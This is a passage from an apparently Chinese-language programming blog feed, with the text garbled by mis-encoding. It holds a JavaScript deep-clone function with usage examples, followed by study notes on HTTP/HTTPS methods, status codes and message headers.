class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">deepClone</span>(<span class="hljs-params">source, map = <span class="hljs-keyword">new</span> <span class="hljs-built_in">WeakMap</span>()</span>) &#123;<br>  <span class="hljs-comment">// å¤„ç†åŸºæœ¬ç±»å‹å’Œå‡½æ•°</span><br>  <span class="hljs-keyword">if</span> (source === <span class="hljs-literal">null</span> || <span class="hljs-keyword">typeof</span> source !== <span class="hljs-string">&#x27;object&#x27;</span>) &#123;<br>    <span class="hljs-keyword">return</span> source;<br>  &#125;<br><br>  <span class="hljs-comment">// å¤„ç†å¾ªç¯å¼•ç”¨</span><br>  <span class="hljs-keyword">if</span> (map.<span class="hljs-title function_">has</span>(source)) &#123;<br>    <span class="hljs-keyword">return</span> map.<span class="hljs-title function_">get</span>(source);<br>  &#125;<br><br>  <span class="hljs-comment">// è·å–åŸå‹</span><br>  <span class="hljs-keyword">const</span> proto = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(source);<br>  <br>  <span class="hljs-comment">// å¤„ç†ç‰¹æ®Šå¯¹è±¡ç±»å‹</span><br>  <span class="hljs-keyword">if</span> (source <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Date</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(source);<br>  &#125;<br>  <br>  <span class="hljs-keyword">if</span> (source <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">RegExp</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(source);<br>  &#125;<br>  <br>  <span class="hljs-keyword">if</span> (source <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Map</span>) &#123;<br>    <span class="hljs-keyword">const</span> cloneMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();<br>    map.<span class="hljs-title function_">set</span>(source, cloneMap);<br>    source.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">value, key</span>) =&gt;</span> &#123;<br>      cloneMap.<span class="hljs-title function_">set</span>(<span class="hljs-title function_">deepClone</span>(key, map), <span class="hljs-title function_">deepClone</span>(value, map));<br>    &#125;);<br>    <span class="hljs-keyword">return</span> cloneMap;<br>  &#125;<br>  <br>  <span class="hljs-keyword">if</span> (source <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Set</span>) &#123;<br>    <span class="hljs-keyword">const</span> cloneSet = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>();<br>    map.<span class="hljs-title function_">set</span>(source, cloneSet);<br>    source.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">value</span> =&gt;</span> &#123;<br>      cloneSet.<span class="hljs-title function_">add</span>(<span class="hljs-title function_">deepClone</span>(value, map));<br>    &#125;);<br>    <span class="hljs-keyword">return</span> cloneSet;<br>  &#125;<br>  <br>  <span class="hljs-keyword">if</span> (source <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">ArrayBuffer</span>) &#123;<br>    <span class="hljs-keyword">return</span> source.<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>);<br>  &#125;<br>  <br>  <span class="hljs-keyword">if</span> (<span class="hljs-title class_">ArrayBuffer</span>.<span class="hljs-title function_">isView</span>(source)) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> source.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span><br><span class="hljs-params">      source.buffer.slice(<span class="hljs-number">0</span>),</span><br><span class="hljs-params">      source.byteOffset,</span><br><span class="hljs-params">      source.byteLength</span><br><span class="hljs-params">    </span>);<br>  &#125;<br><br>  <span class="hljs-comment">// åˆ›å»ºç›®æ ‡å¯¹è±¡å¹¶ä¿ç•™åŸå‹é“¾</span><br>  <span class="hljs-keyword">let</span> target;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(source)) &#123;<br>    target = <span class="hljs-keyword">new</span> proto.<span class="hljs-title function_">constructor</span>(<span class="hljs-params">source.length</span>);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    target = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(proto);<br>  &#125;<br>  <br>  <span class="hljs-comment">// è®°å½•å·²æ‹·è´å¯¹è±¡</span><br>  map.<span class="hljs-title function_">set</span>(source, target);<br><br>  <span class="hljs-comment">// å¤„ç†Symbolå±æ€§</span><br>  <span class="hljs-keyword">const</span> symbolKeys = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getOwnPropertySymbols</span>(source);<br>  <span class="hljs-keyword">const</span> allKeys = [...<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(source), ...symbolKeys];<br>  <br>  <span class="hljs-comment">// é€’å½’æ‹·è´æ‰€æœ‰å±æ€§</span><br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">of</span> allKeys) &#123;<br>    <span class="hljs-comment">// è·³è¿‡åŸå‹å±æ€§</span><br>    <span class="hljs-keyword">if</span> (!source.<span class="hljs-title function_">hasOwnProperty</span>(key)) <span class="hljs-keyword">continue</span>;<br>    <br>    <span class="hljs-comment">// å¤„ç†å±æ€§æè¿°ç¬¦</span><br>    <span class="hljs-keyword">const</span> descriptor = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getOwnPropertyDescriptor</span>(source, key);<br>    <span class="hljs-keyword">if</span> (descriptor &amp;&amp; !descriptor.<span class="hljs-property">enumerable</span>) <span class="hljs-keyword">continue</span>;<br>    <br>    target[key] = <span class="hljs-title function_">deepClone</span>(source[key], map);<br>  &#125;<br>  <br>  <span class="hljs-keyword">return</span> target;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>ä½¿ç”¨ç¤ºä¾‹</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// æµ‹è¯•åŸå‹é“¾ä¿æŒ</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>&#125;<br><span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">greet</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">`Hello, <span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.name&#125;</span>`</span>;<br>&#125;;<br><br><span class="hljs-keyword">const</span> person = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&#x27;Alice&#x27;</span>);<br><span class="hljs-keyword">const</span> clonedPerson = <span class="hljs-title function_">deepClone</span>(person);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(person.<span class="hljs-title function_">greet</span>()); <span class="hljs-comment">// &quot;Hello, Alice&quot;</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(clonedPerson.<span class="hljs-title function_">greet</span>()); <span class="hljs-comment">// &quot;Hello, Alice&quot;</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(clonedPerson) === <span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>); <span class="hljs-comment">// true</span><br><br><span class="hljs-comment">// æµ‹è¯•å¾ªç¯å¼•ç”¨</span><br><span class="hljs-keyword">const</span> obj = &#123; <span class="hljs-attr">a</span>: <span class="hljs-number">1</span> &#125;;<br>obj.<span class="hljs-property">self</span> = obj;<br><span class="hljs-keyword">const</span> clonedObj = <span class="hljs-title function_">deepClone</span>(obj);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(clonedObj.<span class="hljs-property">self</span> === clonedObj); <span class="hljs-comment">// true</span><br><br><span class="hljs-comment">// æµ‹è¯•ç‰¹æ®Šå¯¹è±¡</span><br><span class="hljs-keyword">const</span> map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>([[<span class="hljs-string">&#x27;key&#x27;</span>, <span class="hljs-string">&#x27;value&#x27;</span>]]);<br><span class="hljs-keyword">const</span> clonedMap = <span class="hljs-title function_">deepClone</span>(map);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(clonedMap.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;key&#x27;</span>)); <span class="hljs-comment">// &#x27;value&#x27;</span><br><br><span class="hljs-keyword">const</span> date = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>();<br><span class="hljs-keyword">const</span> clonedDate = <span class="hljs-title function_">deepClone</span>(date);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(clonedDate.<span class="hljs-title function_">getTime</span>() === date.<span class="hljs-title function_">getTime</span>()); <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><p><strong>å…³é”®ç‰¹æ€§</strong></p><ul><li>åŸå‹é“¾ä¿ç•™ï¼š<ul><li>ä½¿ç”¨ Object.create(proto) åˆ›å»ºå¯¹è±¡</li><li>ä¿æŒåŸå‹é“¾ä¸å˜</li></ul></li><li>å¾ªç¯å¼•ç”¨å¤„ç†ï¼š<ul><li>ä½¿ç”¨ WeakMap è·Ÿè¸ªå·²æ‹·è´å¯¹è±¡</li><li>é¿å…æ— é™é€’å½’</li></ul></li><li>å…¨é¢ç±»å‹æ”¯æŒï¼š<ul><li>åŸºæœ¬ç±»å‹</li><li>å¯¹è±¡&#x2F;æ•°ç»„</li><li>å‡½æ•°ï¼ˆç›´æ¥å¼•ç”¨ï¼‰</li><li>Date&#x2F;RegExp</li><li>Map&#x2F;Set</li><li>ArrayBuffer&#x2F;TypedArray</li><li>Symbol å±æ€§</li></ul></li><li>å±æ€§æè¿°ç¬¦å¤„ç†ï¼š<ul><li>è·³è¿‡ä¸å¯æšä¸¾å±æ€§</li><li>ä¿ç•™å±æ€§ç‰¹æ€§</li></ul></li><li>æ€§èƒ½ä¼˜åŒ–ï¼š<ul><li>ä½¿ç”¨ WeakMap é¿å…å†…å­˜æ³„æ¼</li><li>æœ€å°åŒ–å±æ€§éå†</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>JavaScript</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaScript</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç½‘ç»œçŸ¥è¯†ä¸“é¢˜å­¦ä¹ </title>
    <link href="/2025/06/20/Network%20Study%20Notes/"/>
    <url>/2025/06/20/Network%20Study%20Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="ä¸€ã€åŸºç¡€ç½‘ç»œåè®®"><a href="#ä¸€ã€åŸºç¡€ç½‘ç»œåè®®" class="headerlink" title="ä¸€ã€åŸºç¡€ç½‘ç»œåè®®"></a>ä¸€ã€åŸºç¡€ç½‘ç»œåè®®</h1><h2 id="1-1-HTTP-HTTPSåè®®æ ¸å¿ƒ"><a href="#1-1-HTTP-HTTPSåè®®æ ¸å¿ƒ" class="headerlink" title="1.1 HTTP&#x2F;HTTPSåè®®æ ¸å¿ƒ"></a>1.1 HTTP&#x2F;HTTPSåè®®æ ¸å¿ƒ</h2><h3 id="HTTPåè®®"><a href="#HTTPåè®®" class="headerlink" title="HTTPåè®®"></a>HTTPåè®®</h3><p><strong>å®šä¹‰</strong></p><p>HTTPï¼ˆHyperText Transfer Protocolï¼‰æ˜¯åº”ç”¨å±‚åè®®ï¼ŒåŸºäº è¯·æ±‚-å“åº” æ¨¡å‹ï¼Œç”¨äºå®¢æˆ·ç«¯ï¼ˆæµè§ˆå™¨ï¼‰ä¸æœåŠ¡å™¨ä¹‹é—´çš„æ•°æ®ä¼ è¾“ï¼Œé»˜è®¤ç«¯å£ 80</p><p><strong>æ ¸å¿ƒç‰¹æ€§</strong></p><ul><li>æ— çŠ¶æ€ï¼šæ¯ä¸ªè¯·æ±‚ç‹¬ç«‹ï¼ŒæœåŠ¡å™¨ä¸ä¿ç•™å®¢æˆ·ç«¯ä¸Šä¸‹æ–‡ï¼ˆçŠ¶æ€ç®¡ç†ä¾èµ– Cookie å’Œ Sessionï¼‰</li><li>æ˜æ–‡ä¼ è¾“ï¼šè¯·æ±‚ä¸å“åº”å†…å®¹ä»¥æœªåŠ å¯†çš„æ–‡æœ¬å½¢å¼ä¼ è¾“</li><li>å¸¸ç”¨æ–¹æ³•ï¼š<ul><li>GETï¼šè·å–èµ„æº</li><li>POSTï¼šæäº¤æ•°æ®</li><li>PUTï¼šæ›´æ–°èµ„æº</li><li>DELETEï¼šåˆ é™¤èµ„æº</li></ul></li></ul><span id="more"></span><p><strong>æŠ¥æ–‡ç»“æ„</strong></p><p>è¯·æ±‚æŠ¥æ–‡ï¼š</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Text">GET /index.html HTTP/1.1<br>Host: www.example.com<br>User-Agent: Mozilla/5.0<br></code></pre></td></tr></table></figure><p>å“åº”æŠ¥æ–‡ï¼š</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Text">HTTP/1.1 200 OK<br>Content-Type: text/html<br>&lt;html&gt;...&lt;/html&gt;<br></code></pre></td></tr></table></figure><h3 id="HTTPSåè®®"><a href="#HTTPSåè®®" class="headerlink" title="HTTPSåè®®"></a>HTTPSåè®®</h3><p><strong>å®šä¹‰</strong></p><p>HTTPSï¼ˆHTTP secureï¼‰&#x3D; HTTP + TSL&#x2F;SSL åŠ å¯†å±‚ï¼Œåœ¨ä¼ è¾“å±‚å¯¹ HTTP æ•°æ®è¿›è¡ŒåŠ å¯†ï¼Œé»˜è®¤ç«¯å£ 443</p><p><strong>æ ¸å¿ƒæœºåˆ¶</strong></p><p>åŠ å¯†åŸç†ï¼š</p><ul><li>éå¯¹ç§°åŠ å¯†ï¼šä½¿ç”¨å…¬é’¥&#x2F;ç§é’¥å¯¹åå•†ä¼šè¯å¯†é’¥ï¼ˆå¦‚ RSA ç®—æ³•ï¼‰</li><li>å¯¹ç§°åŠ å¯†ï¼šåç»­é€šä¿¡ä½¿ç”¨åå•†çš„ä¼šè¯å¯†é’¥é«˜æ•ˆåŠ å¯†æ•°æ®ï¼ˆå¦‚ AES ç®—æ³•ï¼‰</li></ul><p>èº«ä»½éªŒè¯ï¼šä¾èµ–æ•°å­—è¯ä¹¦ï¼ˆç”± CA é¢å‘ï¼‰éªŒè¯æœåŠ¡å™¨èº«ä»½ï¼Œé˜²æ­¢ä¸­é—´äººæ”»å‡»</p><p><strong>å·¥ä½œæµç¨‹</strong></p><ol><li>å®¢æˆ·ç«¯å‘èµ· HTTPS è¯·æ±‚ï¼ˆclienthelloï¼‰</li><li>æœåŠ¡å™¨è¿”å›æ•°å­—è¯ä¹¦ï¼ˆå«å…¬é’¥ï¼‰</li><li>å®¢æˆ·ç«¯éªŒè¯è¯ä¹¦æœ‰æ•ˆæ€§ï¼ˆCA é“¾ã€æœ‰æ•ˆæœŸç­‰ï¼‰</li><li>å®¢æˆ·ç«¯ç”Ÿæˆä¼šè¯å¯†é’¥ï¼Œç”¨å…¬é’¥åŠ å¯†åå‘é€ç»™æœåŠ¡å™¨</li><li>åŒæ–¹ä½¿ç”¨ä¼šè¯å¯†é’¥è¿›è¡Œå¯¹ç§°åŠ å¯†é€šä¿¡</li></ol><p><strong>æ ¸å¿ƒä¼˜åŠ¿</strong></p><ul><li>æ•°æ®ä¿å¯†ï¼šåŠ å¯†ä¼ è¾“ï¼Œé˜²çªƒå¬</li><li>æ•°æ®å®Œæ•´ï¼šé˜²ç¯¡æ”¹ï¼ˆMAC æ ¡éªŒï¼‰</li><li>èº«ä»½è®¤è¯ï¼šéªŒè¯æœåŠ¡å™¨çœŸå®æ€§</li></ul><h3 id="HTTPè¯·æ±‚æ–¹æ³•ï¼ˆGET-POST-PUT-DELETEï¼‰ä¸çŠ¶æ€ç ï¼ˆ200-301-404-500ï¼‰"><a href="#HTTPè¯·æ±‚æ–¹æ³•ï¼ˆGET-POST-PUT-DELETEï¼‰ä¸çŠ¶æ€ç ï¼ˆ200-301-404-500ï¼‰" class="headerlink" title="HTTPè¯·æ±‚æ–¹æ³•ï¼ˆGET&#x2F;POST&#x2F;PUT&#x2F;DELETEï¼‰ä¸çŠ¶æ€ç ï¼ˆ200&#x2F;301&#x2F;404&#x2F;500ï¼‰"></a>HTTPè¯·æ±‚æ–¹æ³•ï¼ˆGET&#x2F;POST&#x2F;PUT&#x2F;DELETEï¼‰ä¸çŠ¶æ€ç ï¼ˆ200&#x2F;301&#x2F;404&#x2F;500ï¼‰</h3><p><strong>HTTP è¯·æ±‚æ–¹æ³•</strong></p><table><thead><tr><th align="left">æ–¹æ³•</th><th align="left">æ ¸å¿ƒç‰¹æ€§</th><th align="left">å…¸å‹åº”ç”¨åœºæ™¯</th><th align="left">å¹‚ç­‰æ€§</th><th align="left">å®‰å…¨æ€§</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">ä»æœåŠ¡å™¨è·å–èµ„æºï¼Œå‚æ•°é€šè¿‡URLä¼ é€’ï¼ˆé•¿åº¦å—é™ï¼‰</td><td align="left">åŠ è½½é¡µé¢ã€æŸ¥è¯¢æ•°æ®</td><td align="left">æ˜¯</td><td align="left">æ˜¯</td></tr><tr><td align="left">POST</td><td align="left">å‘æœåŠ¡å™¨æäº¤æ•°æ®ï¼ˆè¯·æ±‚ä½“æ‰¿è½½æ•°æ®ï¼‰ï¼Œå¯èƒ½ä¿®æ”¹æœåŠ¡å™¨çŠ¶æ€</td><td align="left">è¡¨å•æäº¤ã€æ–‡ä»¶ä¸Šä¼ ã€ç™»å½•æ“ä½œ</td><td align="left">å¦</td><td align="left">å¦</td></tr><tr><td align="left">PUT</td><td align="left">å®Œæ•´æ›´æ–°æœåŠ¡å™¨èµ„æºï¼ˆéœ€æäº¤å®Œæ•´æ–°æ•°æ®ï¼‰</td><td align="left">æ›´æ–°ç”¨æˆ·èµ„æ–™ã€æ›¿æ¢æ•´ä¸ªæ–‡æ¡£</td><td align="left">æ˜¯</td><td align="left">å¦</td></tr><tr><td align="left">DELETE</td><td align="left">åˆ é™¤æœåŠ¡å™¨æŒ‡å®šèµ„æº</td><td align="left">åˆ é™¤æ–‡ç« ã€ç§»é™¤ç”¨æˆ·è´¦æˆ·</td><td align="left">æ˜¯</td><td align="left">å¦</td></tr></tbody></table><ul><li>å¹‚ç­‰æ€§ï¼šå¤šæ¬¡ç›¸åŒè¯·æ±‚æ•ˆæœ &#x3D; ä¸€æ¬¡è¯·æ±‚ï¼ˆGET&#x2F;PUT&#x2F;DELETE æ˜¯ï¼ŒPOST ä¸æ˜¯ï¼‰</li><li>å®‰å…¨æ€§ï¼šæ˜¯å¦ä¿®æ”¹æœåŠ¡å™¨èµ„æºï¼ˆä»… GET æ˜¯å®‰å…¨çš„ï¼‰</li></ul><p><strong>HTTP çŠ¶æ€ç </strong></p><table><thead><tr><th align="left">çŠ¶æ€ç </th><th align="left">ç±»åˆ«</th><th align="left">æ ¸å¿ƒå«ä¹‰</th><th align="left">å…¸å‹è§¦å‘åœºæ™¯</th></tr></thead><tbody><tr><td align="left">200</td><td align="left">æˆåŠŸ (2xx)</td><td align="left">OK - è¯·æ±‚æˆåŠŸå¤„ç†</td><td align="left">é¡µé¢æ­£å¸¸åŠ è½½ã€APIè¿”å›æœ‰æ•ˆæ•°æ®</td></tr><tr><td align="left">301</td><td align="left">é‡å®šå‘ (3xx)</td><td align="left">Moved Permanently - èµ„æºæ°¸ä¹…è¿ç§»ï¼ˆæµè§ˆå™¨è‡ªåŠ¨ç¼“å­˜æ–°åœ°å€ï¼‰</td><td align="left">ç½‘ç«™åŸŸåå˜æ›´ã€æ—§URLåºŸå¼ƒï¼ˆSEOæƒé‡è½¬ç§»ï¼‰</td></tr><tr><td align="left">404</td><td align="left">å®¢æˆ·ç«¯é”™è¯¯(4xx)</td><td align="left">Not Found - è¯·æ±‚èµ„æºä¸å­˜åœ¨</td><td align="left">URLè·¯å¾„é”™è¯¯ã€é™æ€èµ„æºè¢«åˆ é™¤</td></tr><tr><td align="left">500</td><td align="left">æœåŠ¡å™¨é”™è¯¯(5xx)</td><td align="left">Internal Server Error - æœåŠ¡å™¨å†…éƒ¨å¤„ç†å¤±è´¥</td><td align="left">åç«¯ä»£ç å¼‚å¸¸ã€æ•°æ®åº“è¿æ¥æ•…éšœ</td></tr></tbody></table><h3 id="HTTPæŠ¥æ–‡ç»“æ„ï¼ˆè¯·æ±‚è¡Œã€è¯·æ±‚å¤´ã€è¯·æ±‚ä½“ï¼‰"><a href="#HTTPæŠ¥æ–‡ç»“æ„ï¼ˆè¯·æ±‚è¡Œã€è¯·æ±‚å¤´ã€è¯·æ±‚ä½“ï¼‰" class="headerlink" title="HTTPæŠ¥æ–‡ç»“æ„ï¼ˆè¯·æ±‚è¡Œã€è¯·æ±‚å¤´ã€è¯·æ±‚ä½“ï¼‰"></a>HTTPæŠ¥æ–‡ç»“æ„ï¼ˆè¯·æ±‚è¡Œã€è¯·æ±‚å¤´ã€è¯·æ±‚ä½“ï¼‰</h3><p><strong>è¯·æ±‚æŠ¥æ–‡ç»“æ„</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs Text">[è¯·æ±‚è¡Œ]<br>[è¯·æ±‚å¤´]<br>[ç©ºè¡Œ]<br>[è¯·æ±‚ä½“]<br></code></pre></td></tr></table></figure><p><strong>è¯·æ±‚è¡Œï¼ˆRequest Lineï¼‰</strong></p><ul><li>æ ¼å¼ï¼š<code>[æ–¹æ³•] [URLè·¯å¾„] [åè®®ç‰ˆæœ¬]</code>ï¼ˆ<code>GET /index.html HTTP/1.1</code>ï¼‰</li><li>æ ¸å¿ƒè¦ç´ ï¼š<ul><li>æ–¹æ³•ï¼š<code>GET/POST/PUT/DELETE</code>ç­‰</li><li>URL è·¯å¾„ï¼šèµ„æºè·¯å¾„ï¼Œä¸åŒ…å«åŸŸå</li><li>åè®®ç‰ˆæœ¬ï¼š<code>HTTP/1.1</code> æˆ– <code>HTTP/2</code></li></ul></li></ul><p><strong>è¯·æ±‚å¤´ï¼ˆRequest Headersï¼‰</strong></p><ul><li>æ ¼å¼ï¼š<code>Header-Name: value</code>ï¼ˆ<code>Host: www.example.com</code>ï¼‰</li><li>å…³é”®å­—æ®µï¼š<ul><li>HOSTï¼šç›®æ ‡åŸŸåï¼ˆHTTP&#x2F;1.1 å¿…éœ€ï¼‰</li><li>User-Agentï¼šå®¢æˆ·ç«¯æ ‡è¯†</li><li>Content-typeï¼šè¯·æ±‚åª’ä½“ç±»å‹</li><li>Cookieï¼šä¼šè¯çŠ¶æ€</li></ul></li></ul><p><strong>è¯·æ±‚ä½“ï¼ˆRequest Bodyï¼‰</strong></p><ul><li>ä½ç½®ï¼šç©ºè¡Œä¹‹å</li><li>å†…å®¹ï¼š<ul><li>GET è¯·æ±‚é€šå¸¸æ— è¯·æ±‚ä½“</li><li>POST&#x2F;PUT è¯·æ±‚åŒ…å«æ•°æ®</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JSON"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;admin&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure></li><li>æ ¼å¼ä¾èµ–ï¼šç”± <code>Content-Type</code> è¯·æ±‚å¤´æŒ‡å®š</li></ul><p><strong>å“åº”æŠ¥æ–‡ç»“æ„</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs Text">[çŠ¶æ€è¡Œ]<br>[å“åº”å¤´]<br>[ç©ºè¡Œ]<br>[å“åº”ä½“]<br></code></pre></td></tr></table></figure><p><strong>çŠ¶æ€è¡Œï¼ˆStatus Lineï¼‰</strong></p><ul><li>æ ¼å¼ï¼š<code>[åè®®ç‰ˆæœ¬] [çŠ¶æ€ç ] [çŠ¶æ€æ–‡æœ¬]</code>ï¼ˆ<code>HTTP/1.1 200 OK</code>ï¼‰</li></ul><p><strong>å“åº”å¤´ï¼ˆResponse Headersï¼‰</strong></p><ul><li>æ ¼å¼ï¼š<code>Header-Name: value</code>ï¼ˆ<code>Cache-Control: nocache</code>ï¼‰</li><li>å…³é”®å­—æ®µï¼š<ul><li>Content-typeï¼šå“åº”ä½“ç±»å‹ï¼ˆå¦‚ text&#x2F;htmlï¼‰</li><li>Cache-Controlï¼šç¼“å­˜ç­–ç•¥</li><li>Set-Cookieï¼šä¼šè¯çŠ¶æ€</li></ul></li></ul><p><strong>å“åº”ä½“ï¼ˆResponse Bodyï¼‰</strong></p><ul><li>å†…å®¹ï¼š</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;html&gt;...&lt;/html&gt;<br></code></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JSON"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;data&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;value&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h3 id="è¯·æ±‚-å“åº”å¤´ç»“æ„ï¼ˆContent-Type-Cache-Control-Authorizationï¼‰"><a href="#è¯·æ±‚-å“åº”å¤´ç»“æ„ï¼ˆContent-Type-Cache-Control-Authorizationï¼‰" class="headerlink" title="è¯·æ±‚&#x2F;å“åº”å¤´ç»“æ„ï¼ˆContent-Type&#x2F;Cache-Control&#x2F;Authorizationï¼‰"></a>è¯·æ±‚&#x2F;å“åº”å¤´ç»“æ„ï¼ˆContent-Type&#x2F;Cache-Control&#x2F;Authorizationï¼‰</h3><p><strong>HTTP å¤´éƒ¨æ ¸å¿ƒç»“æ„</strong></p><p>HTTP å¤´æ˜¯é”®å€¼å¯¹é›†åˆï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰ï¼Œä½äºè¯·æ±‚&#x2F;å“åº”æŠ¥æ–‡èµ·å§‹è¡Œä¹‹åï¼Œç©ºè¡Œä¹‹å‰ï¼Œæ ¼å¼å¦‚ä¸‹ï¼š</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Text">Header-Name: value1, value2<br></code></pre></td></tr></table></figure><p><strong>æ ¸å¿ƒè¯·æ±‚&#x2F;å“åº”å¤´è¯¦è§£</strong></p><p>ï¼ˆ1ï¼‰content-Type</p><ul><li>ä½œç”¨ï¼šè®¾ç½®è¯·æ±‚&#x2F;å“åº”ä¸»ä½“çš„åª’ä½“ç±»å‹ï¼ˆMIME ç±»å‹ï¼‰å’Œç¼–ç æ ¼å¼</li><li>è¯·æ±‚å¤´ç¤ºä¾‹ï¼šContent-Type: application&#x2F;json; charset&#x3D;utf-8<ul><li>application&#x2F;jsonï¼šJSON æ ¼å¼æ•°æ®</li><li>charset&#x3D;utf-8ï¼šå­—ç¬¦ç¼–ç </li></ul></li><li>å“åº”å¤´ç¤ºä¾‹ï¼šContent-Type: text&#x2F;html; charset&#x3D;UTF-8</li><li>å‰ç«¯å…³é”®åœºæ™¯ï¼š<ul><li>æäº¤è¡¨å•æ—¶éœ€è®¾ç½®ï¼šapplication&#x2F;x-www-form-urlencodedï¼ˆé»˜è®¤ï¼‰æˆ–multipart&#x2F;form-dataï¼ˆæ–‡ä»¶ä¸Šä¼ ï¼‰</li><li>è°ƒç”¨ API æ—¶éœ€ä¸æœåŠ¡ç«¯åå•†ï¼šapplication&#x2F;jsonï¼ˆRESTful API 